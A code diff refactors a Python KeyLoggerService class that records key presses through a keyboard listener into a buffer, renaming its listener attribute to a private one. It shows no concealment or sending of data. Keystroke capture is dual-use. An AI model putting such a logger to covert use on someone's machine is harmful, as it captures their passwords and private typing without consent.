@@ -7,18 +7,18 @@ class KeyLoggerService(IKeyLogger):
 
 
     def __init__(self):
-        self.listener = None
+        self.__listener = None
         self.__buffer = Buffer()
         self.__is_logging = False
 
     def start_logging(self) -> None:
         self.__is_logging = True
-        self.listener = keyboard.Listener(on_press=self.on_press)
-        self.listener.start()
+        self.__listener = keyboard.Listener(on_press=self.on_press)
+        self.__listener.start()
 
     def stop_logging(self) -> None:
         self.__is_logging = False
-        self.listener.stop()
+        self.__listener.stop()
 
     def get_logged_keys(self) -> List[str]:
         return self.__buffer.get_data()
